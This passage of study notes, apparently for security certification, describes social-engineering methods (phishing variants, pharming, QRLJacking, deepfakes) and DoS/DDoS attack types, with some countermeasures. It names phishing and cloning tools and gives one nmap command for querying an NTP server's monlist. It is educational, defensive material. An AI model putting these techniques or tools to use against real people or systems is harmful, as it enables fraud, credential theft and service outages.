		- Baiting: A physical device, such as a USB flash drive containing malicious files, is strategically placed in a location where it can be easily found, enticing individuals to pick it up and use it.
		- Bait and Switching: Bait and switching is a social engineering technique where the attacker captures the victim's attention by presenting an enticing offer through a clickable link or file download. The victim, lured by the offer, clicks the link or downloads the file, at which point the attacker executes their malicious goals—such as installing malware, stealing sensitive information, or compromising the victim’s security.
		- Quid Pro Quo: Attackers call multiple random numbers within a company, pretending to be from technical support. They offer assistance or services to end users in exchange for confidential data, such as login credentials or other sensitive information.
		- Elicitation: Attackers extract information from the victim by engaging them in casual, non-threatening conversations. By understanding the victim’s interests, attackers tailor their approach to elicit the relevant information without raising suspicion.
	- Computer-based Social Engineering:
		- Phishing:
			- Phishing is the practice of sending fraudulent emails that appear to be from legitimate sources, with the goal of acquiring a user’s personal or account information. Phishing emails or pop-ups often redirect users to counterfeit webpages that mimic trusted sites, where they are prompted to submit sensitive personal information.
			- Types of Phishing:
				- Spear Phishing: A targeted phishing attack directed at specific individuals or groups within an organization. Attackers craft messages with personalized, socially engineered content to deceive their targets and steal sensitive information.
				- Whaling: An attacker targets high-profile individuals, such as CEOs, CFOs, politicians, or celebrities, who have access to confidential and highly valuable information. Through email or website spoofing, the attacker deceives the victim into revealing critical corporate or personal data.
				- Pharming:
					- Pharming is a social engineering technique where the attacker executes malicious programs on a victim’s computer or server. When the victim enters a URL or domain name, their traffic is automatically redirected to an attacker-controlled website. This type of attack is also referred to as “Phishing without a Lure.” The attacker uses this method to steal sensitive information such as credentials, banking details, and other data related to web-based services.
					- DNS Cache Poisoning:
						- In a DNS cache poisoning attack, the attacker targets a DNS server and modifies the IP address associated with a legitimate website (e.g., www.targetwebsite.com) to redirect to a malicious website (e.g., www.hackerwebsite.com).
						- When the victim enters the legitimate website’s URL in the browser's address bar, the browser sends a request to the DNS server to obtain the IP address of the target website. However, the DNS server, already compromised by the attacker, returns the fake IP address.
						- As a result, the victim is redirected to the attacker-controlled fake website, where sensitive information may be stolen or malicious actions performed.
					- Host File Modification:
						- In a host file modification attack, the attacker sends malicious code to the victim, often as an email attachment. When the victim clicks on the attachment, the code executes and alters the local host file on the user’s computer.
						- Once the host file is compromised, any attempt by the victim to access a legitimate website by entering its URL in the browser’s address bar results in automatic redirection to a fraudulent website controlled by the attacker.
						- Pharming attacks can also be carried out using malware, such as Trojan horses or worms, which modify host files or other system settings to achieve the same malicious outcome.
				- Spimming: A variant of spam that exploits instant messaging platforms to flood networks with spam messages. Attackers use bots to harvest instant messaging IDs and spread malicious or unwanted content across the platform.
				- Clone Phishing: An attacker creates a nearly identical copy of a legitimate email or communication. This clone includes a malicious link or attachment, often replacing elements from the original message to point to a harmful destination.
				- E-wallet Phishing: Attackers target electronic wallet users by sending phishing emails or messages, pretending to be a legitimate e-wallet provider to steal sensitive financial information.
				- Tabnabbing and Reverse Tabnabbing:
					- Tabnabbing: A malicious webpage tricks users by altering its content to resemble a familiar site (e.g., a bank login page) when the user switches back to the tab, capturing their credentials.
					- Reverse Tabnabbing: A seemingly legitimate website deceives users into opening a malicious link, which then changes the content of the original tab into a phishing site.
				- Consent Phishing: Attackers exploit the OAuth authentication protocol used by web services. They create a fake, legitimate-looking application or website and lure victims to it, tricking them into granting access to sensitive information.
				- Search Engine Phishing: Attackers manipulate search engine results to lead users to fraudulent websites designed to steal sensitive information or distribute malware. This is achieved through techniques like search engine optimization (SEO) manipulation, keyword stuffing, and other methods to ensure the malicious websites rank highly in search results.
			- Phishing Tools:
				- ShellPhish : ShellPhish is a phishing tool used to phish user credentials from various social networking platforms such as Instagram, Facebook, Twitter, and LinkedIn. It also displays the victim system’s public IP address, browser information, hostname, geolocation, and other information.
				- Social-Engineer Toolkit (SET) : The Social-Engineer Toolkit (SET) is an open-source, Python-driven tool designed for penetration testing through social engineering. It is a versatile framework built to execute advanced attacks against human targets, aiming to extract sensitive information. SET categorizes its attacks based on the attack vector, such as email, web, and USB attacks. The toolkit exploits human vulnerabilities, such as trust, fear, greed, and the innate helpfulness of individuals, to achieve its objectives.

		- Spam Mail : Spam consists of irrelevant, unwanted, and unsolicited emails designed to gather sensitive financial information, such as Social Security numbers or bank details. Attackers send spam messages to lure victims into sharing confidential data or to distribute email attachments containing malicious software like viruses or Trojans. Social engineers often disguise the file extensions of these attachments with long filenames to deceive the recipient.
		- Instant Chat Messenger : In this technique, an attacker engages in conversations with selected online users through instant messaging platforms. They aim to gather personal information, such as dates of birth or maiden names, which can then be used to crack user accounts or exploit other vulnerabilities.
		- Pop-up Window Attacks : Pop-ups are used to trick or compel users into clicking on hyperlinks that redirect them to fake web pages. These pages may request personal information or download malicious programs such as keyloggers, Trojans, or spyware. A common tactic to entice users is by displaying a warning about a problem, such as a realistic operating system or application error message, or by offering additional services.
		- Scareware : Scareware is a type of malware that tricks users into visiting malware-infested websites, downloading malicious software, or purchasing potentially harmful programs. It often appears in the form of pop-ups that claim the user’s machine is infected with malware. These pop-ups are designed to look like legitimate alerts from reputable antivirus companies. They create a sense of urgency, prompting the victim to quickly download the suggested software to remove the supposed virus.
		- Hoax Letters : A hoax letter is a message that warns recipients of a non-existent computer virus threat. It relies on social engineering to spread widely. While hoaxes do not usually cause physical damage or data loss, they waste time, reduce productivity, and consume valuable organizational network resources.
		- Chain Letters : A chain letter is a message that promises free gifts, such as money or software, on the condition that the recipient forwards the email to a predetermined number of people. These messages often use emotionally compelling stories, “get-rich-quick” pyramid schemes, spiritual beliefs, or superstitious threats of bad luck if the recipient fails to pass the message along. Chain letters also rely heavily on social engineering tactics to propagate.
		- Create Deepfake Videos:
			- Attackers create deepfake videos of a target individual by utilizing previously recorded audio and video samples. These samples may include narratives of deceased persons, stolen online account clippings, or clips associated with unknown identities. By cloning and manipulating these clips, attackers generate highly convincing fake videos. The goal of such deepfake attempts is to deceive online users into believing they are viewing authentic content. These videos can be used for malicious purposes, such as impersonation, spreading misinformation, or committing fraud.

				- Hoodem (hoodem.com)
		- Voice Cloning:
			- Voice cloning using AI involves the use of sophisticated machine learning algorithms to create highly convincing imitations of an individual's voice. These attacks exploit techniques such as speech synthesis and neural network-based models to accurately replicate the unique characteristics of a person.

				- voice.ai (voice.ai)
		- Perform Impersonation on Social Networking Sites:
			- Malicious users collect confidential information from social networking sites and create accounts using another person’s name. These attackers use fraudulent profiles to build extensive networks of friends and extract sensitive information by employing various social engineering techniques.
		- Identity Theft:
			- Identity theft is a crime where an imposter steals personally identifiable information, such as a person’s name, credit card number, Social Security number, or driver’s license number, to commit fraud or other crimes. Attackers may also use identity theft to impersonate employees of a target organization and gain physical access to restricted facilities.
	- Mobile-based Social Engineering:
		- Publishing Malicious Apps:
			- An attacker creates a malicious application, such as a gaming app with appealing features, and publishes it on major application stores under a popular or misleading name. Unsuspecting users download the application, believing it to be legitimate.
			- Once installed, the app infects the device with malware, which collects and transmits sensitive information, such as usernames, passwords, contact details, and other personal data, to the attacker.
		- Repackaging Legitimate Apps:
			- Malware can sometimes be hidden within legitimate apps. Platform vendors provide centralized marketplaces where users can conveniently browse and install games and applications. Developers typically submit their apps to these marketplaces.
			- However, a malicious developer may download a legitimate app, repackage it with malware, and upload it to a third-party application store. When an unsuspecting user downloads the repackaged app, the malicious program infects the device, collects sensitive user information, and sends it to the attacker.
		- Using Fake Security Applications:
			- In this attack, the attacker begins by infecting the victim’s computer with malicious software. They then upload a fraudulent application to an app store. When the victim logs into their bank account, the malware displays a pop-up message instructing them to download a security application on their phone to receive an important message. Believing the pop-up to be legitimate, the victim downloads the application from the attacker’s app store.
			- Once the application is installed, the attacker gains access to confidential information, such as the victim's bank account login credentials (username and password). When the bank sends a second authentication code to the victim via SMS, the attacker intercepts and uses this information to gain unauthorized access to the victim’s bank account.
		- SMiShing (SMS Phishing):
			- SMiShing, or SMS phishing, is the act of using SMS text messaging on cellular phones or other mobile devices to deceive users into taking immediate action. This may include downloading malware, visiting a malicious webpage, or calling a fraudulent phone number. SMiShing messages are carefully crafted to prompt an urgent response from the victim, often tricking them into revealing personal information, account credentials, or financial details.
		- QRLJacking:
			- QRLJacking is a social engineering attack that exploits the QR code login mechanism used in various web applications to hijack login sessions and gain unauthorized access to victims' accounts. This method allows attackers to take full control of the compromised accounts and steal sensitive data.
			- Additionally, during the login process, attackers can obtain further details, such as the victim’s current GPS location, device ID, IMEI, and SIM card information. These details enable malicious activities, including unauthorized transactions, impersonation, and sending spam messages.
			- Cloning the QR code captured from a legitimate website is a critical step in a QRLJacking attack. Attackers can use tools like QR TIGER to clone a legitimate QR code and modify it for malicious purposes.
			- QR Code Cloning Tools:
				- QR TIGER:
					- QR TIGER is a QR code generator tool that enables attackers to create duplicate copies of legitimate QR codes. It can clone both static and dynamic QR codes, and generate multiple duplicates stored in a folder.
					- Additionally, QR TIGER allows attackers to track information from dynamic QR codes, such as the number of scans, the time and location of scans, and the type of device used for scanning. This tracking capability can assist in monitoring and targeting specific users, making it a powerful tool for malicious activities.

# Denial-of-Service

- A Denial-of-Service (DoS) attack is an attempt to disrupt the normal functioning of a computer system or network by reducing, restricting, or completely preventing legitimate users from accessing system resources. During a DoS attack, the attacker floods the victim’s system with illegitimate service requests or traffic, overloading its resources and causing the system to crash or perform poorly. This often results in the victim’s website becoming unavailable or its system/network performance being significantly degraded. The primary objective of a DoS attack is to deny access to legitimate users, rather than to gain unauthorized access or corrupt data.
- DoS attacks typically target either network bandwidth or system connectivity:
	- Bandwidth Attacks: These attacks overwhelm the network by generating an excessive volume of traffic, consuming available network resources and preventing legitimate users from accessing them.
	- Connectivity Attacks: These attacks bombard a system with a massive number of connection requests, exhausting the operating system’s resources and preventing it from processing legitimate user requests.
- Impacts of DoS Attacks:
	- Resource Consumption: Depleting critical system resources, such as memory, CPU time, or data structures
	- Bandwidth Overload: Consuming network bandwidth, disk space, or other essential resources
	- Physical Damage: Damaging or altering network components
	- Data Destruction: Corrupting or deleting programming and files within the affected system
- Examples of DoS Attack Types:
	- Flooding the victim’s system with more traffic than it can handle
	- Overloading a service (e.g., Internet Relay Chat (IRC)) with more events than it can process
	- Crashing a TCP/IP stack by sending corrupted packets
	- Disrupting a service by interacting with it in an unexpected or malicious manner
	- Causing a system to hang by forcing it into an infinite loop
- Distributed Denial-of-Service:
	- A Distributed Denial-of-Service (DDoS) attack is a large-scale, coordinated form of a Denial-of-Service (DoS) attack that targets the availability of a victim’s system or network resources. It is carried out indirectly through numerous compromised computers, often referred to as botnets, distributed across the Internet.
	- By leveraging client/server technology, the attacker can significantly amplify the impact of the attack by utilizing the resources of multiple unwitting accomplice computers, which act as platforms for the assault. The overwhelming flood of incoming messages or traffic to the target system forces it to shut down or become unresponsive, effectively denying service to legitimate users.
	- The main goal of a DDoS attack is to compromise multiple systems and use them to overwhelm a victim’s resources. Attackers identify vulnerable systems using custom scripts, gain access, and install DDoS software.
	- The attack is initiated by sending commands to zombie agents—compromised computers controlled via a command-and-control (C&C) server. These agents send spoofed connection requests to reflector systems, impersonating the victim’s IP address. The reflectors then flood the victim with responses, overwhelming its system. This traffic overload reduces performance or causes the system to shut down.
	- Botnets:
		- A botnet (short for “robot network”) is a large network of compromised systems that are “infected” with bots (also known as zombies). Attackers use these bots to form a botnet, enabling them to launch DDoS attacks, generate spam, spread malware, and commit other cybercrimes.
		- Bots are software applications that automate tasks over the Internet. They can be used maliciously to exploit system vulnerabilities, perform illegal activities, or run hidden programs to identify weaknesses. Botnets act as agents controlled by intruders to carry out such activities.
		- However, not all bots are malicious. They are also used for benign purposes, such as data collection, web crawling, or data mining. For example, bots may coordinate DoS attacks or assist in “web spidering.” There are various types of bots, including Internet bots, IRC bots, and chatterbots. Examples of IRC bots include Cardinal, Sopel, Eggdrop, and EnergyMech.
		- Botnets can be used by attackers to perform the following activities:
			- Launch DDoS attacks to overwhelm systems.
			- Generate spam emails on a massive scale.
			- Sniff network traffic to intercept sensitive data.
			- Perform keylogging to capture user input, such as passwords.
			- Spread new malware across systems.
			- Install unwanted advertisement add-ons on victim devices.
			- Exploit Google AdSense for fraudulent revenue.
			- Attack IRC chat networks to disrupt communication.
			- Manipulate online polls and games to skew results.
			- Commit mass identity theft by harvesting personal information.
			- Perform credential stuffing attacks using stolen login credentials.
			- Conduct cryptocurrency mining using victim system resources.
		- Scanning Methods for Finding Vulnerable Machines:
			- Random Scanning: Infected machines randomly probe IP addresses in a target network to find vulnerabilities. Once a machine is compromised, malicious code is installed. This method generates high traffic and slows as uninfected IPs decrease.
			- Hit-List Scanning: Attackers compile a list of vulnerable machines and scan for targets. Once a machine is infected, the list is divided, and the new host continues scanning. This approach rapidly infects machines.
			- Topological Scanning: Infected machines use information (e.g., URLs) from their systems to locate and compromise new targets. This method is precise and efficient.
			- Local Subnet Scanning: Infected machines target vulnerable systems within their local network, often bypassing firewalls. It’s often combined with other techniques.
			- Permutation Scanning: Attackers share a pseudorandom list of IPs. Scanning starts from a random point and skips infected machines. Scanning stops after repeated encounters with infected hosts, then restarts with a new key.
		- How Malicious Code Propagates:
			- Central Source Propagation: The attacker stores the attack toolkit on a central server. When a vulnerable machine is found, the central source transfers a copy of the toolkit to the compromised system, where it is installed automatically using scripting mechanisms. The infected system then searches for other vulnerable machines to repeat the process. Common protocols used include HTTP, FTP, and RPC.
			- Back-chaining Propagation: The attacker keeps the attack toolkit on their own system. When a vulnerable machine is discovered, the attacker’s machine establishes a connection to the compromised system and transfers the toolkit. Tools such as port listeners or intruder-installed web servers use the Trivial File Transfer Protocol (TFTP) for back-channel file transfer.
			- Autonomous Propagation: In this method, the attacking host directly transfers the attack toolkit to the vulnerable system at the moment it breaches it, without relying on an external file source.
- Categories of DoS/DDoS Attack Vectors:
	- Volumetric Attacks:
		- Volumetric attacks consume the bandwidth of a target network or service by generating a large volume of packets. The magnitude of such attacks is measured in bits per second (bps). They often target protocols like the Network Time Protocol (NTP), Domain Name System (DNS), and Simple Service Discovery Protocol (SSDP), which are stateless and lack built-in congestion avoidance mechanisms.
		- Types of Bandwidth Depletion Attacks:
			- Flood Attack: Zombies send large volumes of traffic to the victim’s system, exhausting its bandwidth.
			- Amplification Attack: The attacker or zombies send messages to a broadcast IP address, amplifying malicious traffic that consumes the victim’s bandwidth.
		- Volumetric Attack Techniques: 
			- UDP Flood Attack
			- ICMP Flood Attack
			- Ping of Death (PoD) Attack
			- Smurf Attack
			- Pulse Wave Attack
			- Zero-day Attack
			- Malformed IP Packet Flood Attack
			- Spoofed IP Packet Flood Attack
			- NTP Amplification Attack
	- Protocol Attacks:
		- Protocol attacks consume resources like connection state tables in network infrastructure components such as load balancers, firewalls, and application servers. As a result, no new connections can be established because the device waits for existing connections to close or expire. The magnitude of the attack is measured in packets per second (pps) or connections per second (cps).
		- Protocol Attack Techniques:
			- Synchronize (SYN) Flood Attack
			- Fragmentation Attack
			- Spoofed Session Flood Attack
			- Acknowledgement (ACK) Flood Attack
			- SYN-ACK Flood Attack
			- ACK and PUSH ACK Flood Attack
			- TCP Connection Flood Attack
			- TCP State Exhaustion Attack
			- RST Attack
			- TCP SACK Panic Attack
	- Application Layer Attacks:
		- In application layer attacks, the attacker exploits vulnerabilities in application layer protocols or the application itself to deny legitimate users access. Attacks on unpatched, vulnerable systems require less bandwidth to succeed compared to protocol or volumetric DDoS attacks.
		- Application DDoS attacks target application layer resources by opening connections and leaving them open, preventing new connections from being established. These attacks are designed to disrupt a specific aspect of an application or service and can be effective with only a few attacking machines generating low traffic rates. The magnitude of such attacks is measured in requests per second (rps).
		- These attacks are particularly difficult to detect and mitigate. Application-level flood attacks can result in service outages, such as loss of email functionality, network resources, or temporary shutdowns of applications and services.
		- Application Layer Attack Techniques:
			- HTTP GET/POST Attack
			- Slowloris Attack
			- UDP Application Layer Flood Attack
			- DDoS Extortion Attack
- DoS/DDoS Attack Techniques:
	- UDP Flood Attack:
		- In a UDP flood attack, an attacker sends spoofed UDP packets at a very high rate to random ports on a target server, using a wide range of source IP addresses. The flood of UDP packets forces the server to repeatedly check for non-existent applications on the targeted ports.
		- As a result, legitimate applications become inaccessible, and any attempts to access them generate an ICMP “Destination Unreachable” error reply. This attack consumes network resources and available bandwidth, eventually exhausting the network and causing it to go offline.
	- ICMP Flood Attack:
		- ICMP is primarily used by network administrators for IP operations, troubleshooting, and error messaging for undeliverable packets. In an ICMP flood attack, attackers send large volumes of ICMP echo request packets to a victim’s system, either directly or through reflection networks. These packets prompt the victim’s system to reply, and the resulting high traffic saturates the victim's network bandwidth, overwhelming the connection and preventing it from responding to legitimate TCP/IP requests.
		- To mitigate ICMP flood attacks, a threshold can be set to activate ICMP flood protection when exceeded. If the ICMP threshold is surpassed, the router blocks further ICMP echo requests from all addresses in the same security zone for the remainder of the current second and the following second.
	- Ping of Death Attack:
		- A Ping of Death (PoD) attack involves an attacker attempting to crash, destabilize, or freeze a target system or service by sending malformed or oversized packets using a simple ping command. For instance, an attacker might send a packet with a size of 65,538 bytes to a target server. This size exceeds the RFC 791 IP limit of 65,535 bytes. When the receiving system attempts to reassemble the oversized packet, it may cause the system to crash or become unstable.
		- In such attacks, the attacker’s identity can be easily spoofed, and the attacker typically requires only the target’s IP address, without needing detailed knowledge of the system.
	- Smurf Attack:
		- In a Smurf attack, the attacker spoofs the source IP address to match the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast address. This action triggers all the hosts on the broadcast network to respond to the ICMP ECHO requests. Since the source IP was spoofed, the responses are directed to the victim’s machine, creating significant traffic that can overwhelm the victim’s system and potentially cause it to crash.
	- Pulse Wave Attack:
		- Pulse wave DDoS attacks are a sophisticated type of DDoS attack used by threat actors to disrupt the operations of target systems. Unlike traditional DDoS attacks, which involve continuous traffic flows, pulse wave attacks feature periodic, high-intensity traffic bursts that consume the entire bandwidth of the target network.
		- Attackers send highly repetitive bursts of packets, or "pulses," to the victim at regular intervals, typically every 10 minutes. These attack sessions can last for hours or even days. A single pulse, often exceeding 300 Gbps, is sufficient to overwhelm a network's bandwidth capacity. Recovery from such attacks is extremely challenging and sometimes impossible.
	- Zero-Day DDos Attack:
		- Zero-day DDoS attacks exploit vulnerabilities that have no available patches or effective defensive mechanisms. Until the victim identifies the attacker’s strategy and implements a patch for the exploited vulnerability, the attacker can block access to the victim’s resources and potentially steal sensitive data. These attacks can inflict significant damage on the victim’s network infrastructure and assets.
		- At present, there is no universal or versatile solution to fully protect networks from zero-day DDoS attacks.
	- NTP Amplification Attack:
		- The Network Time Protocol (NTP) is used to synchronize time across networks, including host machines, processes, and devices. It ensures precise timekeeping, which is essential for various network activities, protocols, and logs.
		- In an NTP amplification attack, an attacker leverages a botnet to send large UDP packets with a spoofed source IP address (impersonating the victim's real IP address) to an NTP server. This attack typically exploits NTP server with its vulnerable monlist command enabled. Each UDP packet triggers a request to the NTP server via the monlist command, causing the server to generate and send large response packets. The server, unaware of the spoofed source, directs these responses to the victim’s IP address.
		- As a result, the victim’s network is overwhelmed with large response packets, flooding its infrastructure with unwanted traffic. This leads to a denial-of-service scenario, causing severe network congestion, service disruption, and depletion of critical resources, such as bandwidth, memory, and processing power.
		- Retrieve Monlist from an NTP Server:
			- After executing the command, Nmap provides a list of public and private clients that have communicated with the NTP server.
			- nmap -sU -pU:123 -Pn -n --script=ntp-monlist <ip>
		- Countermeasures for NTP Amplification Attacks:
			- Secure and harden NTP server configurations to prevent exploitation of the monlist command.
			- Enable flow control mechanisms on the NTP server to limit traffic.
			- Regularly monitor the network for abnormal behavior or suspicious activity.
			- Implement a zero-trust network architecture to enhance security.
			- Use firewalls to filter and restrict NTP server requests.
	- TCP State Exhaustion Attack:
		- A TCP state exhaustion attack targets network devices such as firewalls, load balancers, and servers by exploiting the stateful nature of the TCP protocol. These attacks aim to overwhelm the capacity of these devices to maintain active connection states, causing disruptions to legitimate traffic.
		- In the TCP protocol, devices track connection states (e.g., SYN_SENT, ESTABLISHED, CLOSED) for every active session. Attackers exploit this by generating a massive number of TCP connections, often leaving them incomplete or flooding the system with unnecessary state-tracking tasks. This can exhaust the device's available resources, such as memory and connection tables, rendering it unable to handle new or legitimate connections.
		- Types of TCP State Exhaustion Attacks include SYN Flood, ACK Flood, and RST/FIN Flood.
	- SYN Flood Attack:
		- In a SYN flood attack, the attacker sends a large number of SYN requests to the target server (victim) using fake source IP addresses. This attack creates incomplete TCP connections, consuming network resources and overwhelming the target system.
		- Normally, when a client initiates a TCP connection with a server, the connection is established using the TCP three-way handshake. In a SYN flood attack, the attacker exploits this process. The attacker sends fake TCP SYN requests to the target server. When the server responds with a SYN/ACK, the attacker never completes the handshake by sending the final ACK. This leaves the server waiting indefinitely, tying up resources.
		- SYN flooding exploits flaws in the way most systems implement the TCP three-way handshake. The attack overwhelms the server by sending an unlimited number of SYN packets faster than the system can process them. The server's listening queue becomes filled with partially open connections while it waits for ACK packets that never arrive, eventually leading to resource exhaustion and service disruption.
		- Countermeasures for SYN Flood Attacks:
			- Proper packet filtering is an effective solution to mitigate SYN flood attacks. Administrators can also fine-tune the TCP/IP stack to minimize the impact of these attacks while ensuring legitimate client traffic is unaffected.
			- Some SYN flood attacks aim not to disrupt servers but to consume the entire bandwidth of an internet connection. Tools like SYN Cookies and SynAttackProtect can help counter such attacks.
			- To further safeguard against bandwidth exhaustion, administrators can implement additional measures:
				- Reducing the timeout period during which a pending connection remains in the "SYN RECEIVED" state in the queue.
				- Decreasing the retransmission interval for the first ACK packet if no response is received from the client.
				- Limiting the number of packet retransmissions or disabling retransmissions entirely.
	- SYN-ACK Flood Attack:
		- A SYN-ACK flood attack is similar to a SYN flood attack, but it targets the second stage of the TCP three-way handshake. In this attack, the attacker sends a large number of SYN-ACK packets to the target machine, overwhelming its resources. This flood of packets prevents the target from processing legitimate traffic, ultimately exhausting its capacity and disrupting normal operations.
	- ACK and PUSH ACK Flood Attack:
		- In an active TCP session, ACK and PUSH ACK flags are used to transfer data between the server and client machines until the session concludes. In an ACK and PUSH ACK flood attack, attackers send a large volume of spoofed ACK and PUSH ACK packets to the target machine, overwhelming its resources and rendering it non-functional.
	- ACK Flood Attack:
		- In an ACK flood attack, the attacker overwhelms the target system by sending a massive number of TCP ACK packets. These packets flood the target's network or server, consuming its bandwidth and processing resources. Since the target must process each ACK packet as part of TCP session handling, this attack can lead to performance degradation or complete denial of service, making it difficult for legitimate users to access the target system.
	- Fragmentation Attack:
		- Fragmentation attacks disrupt a victim’s ability to reassemble fragmented packets by flooding it with TCP or UDP fragments, leading to reduced performance. In these attacks, the attacker sends a large number of oversized fragmented packets (exceeding 1500 bytes) to a target web server at a relatively low packet rate.
		- Since network protocols permit fragmentation, these packets often bypass inspection by network devices such as routers, firewalls, and IDS/IPS. The process of reassembling and inspecting these large fragmented packets consumes excessive system resources.
		- Additionally, the attacker randomizes the content within the packet fragments, further increasing the complexity of reassembly and inspection. This excessive resource consumption can eventually lead to system crashes or significant degradation in performance.
	- Spoofed Session Flood Attack:
		- In this type of attack, attackers create fake or spoofed TCP sessions by sending multiple SYN, ACK, and RST or FIN packets. This technique is used to bypass firewalls and perform DDoS attacks against target networks, ultimately exhausting its network resources.
		- Examples of Spoofed Session Flood Attacks:
			- Multiple SYN-ACK Spoofed Session Flood Attack:
				- Attackers create a fake session by sending multiple SYN and ACK packets, along with one or more RST or FIN packets.
			- Multiple ACK Spoofed Session Flood Attack:
				- Attackers create a fake session by skipping SYN packets entirely and sending only multiple ACK packets along with one or more RST or FIN packets. Since SYN packets are not used and most firewalls rely on SYN packet filters to detect abnormal traffic, these attacks have a low detection rate.
	- HTTPS GET/POST Attack:
		- HTTP attacks are Layer-7 attacks that exploit the HTTP protocol. HTTP clients, such as web browsers, connect to a web server using the HTTP protocol to send requests, such as HTTP GET or HTTP POST. Attackers take advantage of these requests to perform DoS attacks.
		- An HTTP GET/POST attack is a sophisticated Layer-7 attack that does not rely on malformed packets, spoofing, or reflection techniques. It requires significantly less bandwidth compared to other attacks to incapacitate the targeted site or web server.
		- The goal of this attack is to force the server to allocate as many resources as possible to process the attack, thereby denying legitimate users access to the server’s resources.
		- HTTP GET Attack:
			- In an HTTP GET attack, the attacker uses a time-delayed HTTP header to maintain an HTTP connection and exhaust the web server’s resources. The attacker never sends the full request to the target server, causing the server to retain the HTTP connection and wait indefinitely. This prevents the server from processing requests from legitimate users. In such attacks, network parameters may appear normal, even while the service is unavailable.
		- HTTP POST Attack:
			- In an HTTP POST attack, the attacker sends HTTP requests with complete headers but an incomplete message body to the target web server or application. Since the message body is incomplete, the server continues to wait for the remainder, making it unavailable to legitimate users.
		- Additional HTTP Flood Attacks:
			- Single-Session HTTP Flood Attack: In this type of attack, an attacker exploits vulnerabilities in HTTP 1.1 to send multiple requests within a single HTTP session, overwhelming the target server.
			- Single-Request HTTP Flood Attack: In this attack, the attacker sends multiple HTTP requests concealed within a single HTTP packet during a single session. This technique enables attackers to remain anonymous and undetected while carrying out DDoS attacks.
			- Recursive HTTP GET Flood Attack: Staying undetected is key for attackers. In this attack, an attacker poses as a legitimate user and performs seemingly valid actions to deceive firewalls into believing the source is legitimate. The recursive GET method collects a list of pages or images and appears to navigate through them. However, it stealthily floods the target with requests. When combined with an HTTP flood attack, recursive GET attacks can inflict significant damage on the target system.
			- Random Recursive GET Flood Attack: This variation of the recursive GET flood attack targets forums, blogs, and other websites with sequentially numbered pages. Similar to the recursive GET flood attack, the attacker pretends to browse through pages. However, instead of following a sequence, the attacker uses random numbers from a valid page range to simulate legitimate user behavior, sending new GET requests each time. Both recursive GET and random recursive GET flood attacks overwhelm the target with a high volume of GET requests, ultimately exhausting its resources.
	- Slowloris Attack:
		- Slowloris is a DDoS attack tool designed to perform Layer-7 DDoS attacks, targeting web infrastructure. Unlike other tools, Slowloris uses entirely legitimate HTTP traffic to disrupt a target server.
		- In a Slowloris attack, the attacker sends partial HTTP requests to the target web server or application. Upon receiving these requests, the target server opens multiple connections and waits for them to complete. However, the requests remain incomplete, filling up the server's maximum concurrent connection pool. As a result, additional connection attempts are denied, making the server inaccessible to legitimate users.
	- UDP Application Layer Flood Attack:
		- Although UDP flood attacks are primarily known for their volumetric nature, certain application layer protocols that rely on UDP can also be exploited by attackers to perform flooding attacks on target networks.
		- Examples of UDP-based Application Layer Protocols that attackers can use to flood target networks:
			- Character Generator Protocol (CHARGEN)
			- Simple Network Management Protocol Version 2 (SNMPv2)
			- Quote of the Day (QOTD)
			- Remote Procedure Call (RPC)
			- Simple Service Discovery Protocol (SSDP)
			- Connection-less Lightweight Directory Access Protocol (CLDAP)
			- Trivial File Transfer Protocol (TFTP)
			- Network Basic Input/Output System (NetBIOS)
			- Network Time Protocol (NTP)
			- Quake Network Protocol
			- Steam Protocol
			- Voice over Internet Protocol (VoIP)
	- Multi-Vector Attack:
		- In multi-vector DDoS attacks, attackers combine volumetric, protocol, and application-layer attack techniques to overwhelm and disrupt the target system or service. They rapidly switch from one type of DDoS attack (e.g., SYN flood) to another (e.g., layer-7 attack). These attacks can be launched sequentially, with one vector at a time, or simultaneously through multiple vectors.
		- The objective is to confuse the target’s IT department, forcing them to expend significant resources and divert their attention, while the attack continues to cause damage.
	- Peer-to-Peer Attack:
		- A peer-to-peer attack is a type of DDoS attack in which attackers exploit vulnerabilities in peer-to-peer servers to initiate an attack. They take advantage of flaws in networks using the Direct Connect (DC++) protocol, which facilitates file exchanges between instant-messaging clients. Unlike botnet-based attacks, a peer-to-peer attack does not rely on botnets or require direct communication with the clients being exploited. Instead, the attacker instructs clients from large peer-to-peer file-sharing hubs to disconnect from their network and connect to the victim’s website. As a result, thousands of computers aggressively attempt to connect to the target website, significantly degrading its performance or causing it to crash.
		- Peer-to-peer attacks are relatively easy to identify based on their signatures. Attackers can use this method to launch large-scale DoS attacks against websites. To mitigate peer-to-peer DDoS attacks, restricting specific ports for peer-to-peer communication is an effective strategy. For example, disallowing peer-to-peer communication on port 80 minimizes the risk of attacks targeting websites.
	- Permanent Denial-of-Service Attack (PDoS):
		- Permanent DoS (PDoS) attacks, also known as "phlashing," specifically target hardware to cause irreversible damage to the system hardware. Unlike other types of DoS attacks that disrupt services temporarily, PDoS attacks sabotage the system’s hardware, often requiring the victim to replace or reinstall the damaged components. PDoS attacks exploit security vulnerabilities in a device’s management interfaces, such as those found in printers, routers, and other networking devices. By targeting these flaws, attackers gain unauthorized remote access and control over the victim’s hardware.
		- This type of attack is faster and more destructive than traditional DoS attacks. Unlike DDoS attacks that rely on a network of compromised machines (zombies), PDoS attacks achieve their goal with minimal resources. Attackers commonly use a technique called “bricking,” where they render hardware completely inoperable.
		- In a PDoS attack, the attacker sends fraudulent emails, IRC messages, tweets, or videos containing links to fake hardware updates. These updates are deliberately modified with vulnerabilities or corrupted firmware. When the victim clicks on a malicious link or pop-up and installs the fraudulent update, the attacker gains complete control of the device. This results in permanent damage, effectively rendering the system unusable.
	- TCP SACK Panic Attack:
		- A TCP Selective Acknowledgment (SACK) panic attack is a remote attack vector where attackers attempt to crash a target Linux machine by sending SACK packets with a malformed maximum segment size (MSS). This attack exploits an integer overflow vulnerability in the Linux Socket Buffer (SKB), which can lead to kernel panic.
		- Linux systems commonly use the TCP SACK mechanism, where the sender is informed about successfully acknowledged packets by the receiver. This allows the sender to retransmit only those packets that were not acknowledged. Linux uses a linked-list data structure called the socket buffer to store data until it is either acknowledged or received. The socket buffer can store a maximum of 17 segments, and once packets are acknowledged, they are deleted from the buffer. However, if the socket buffer attempts to store more than 17 segments, it can cause a kernel panic due to integer overflow.
		- Attackers exploit this vulnerability in a TCP SACK panic attack by sending specially crafted SACK packets in sequence to the target server. They set the MSS to the lowest possible value (48 bytes), which increases the number of TCP segments requiring retransmission. This overloads the socket buffer, causing it to exceed its 17-segment limit. The resulting integer overflow triggers a kernel panic, leading to a denial-of-service (DoS) condition.
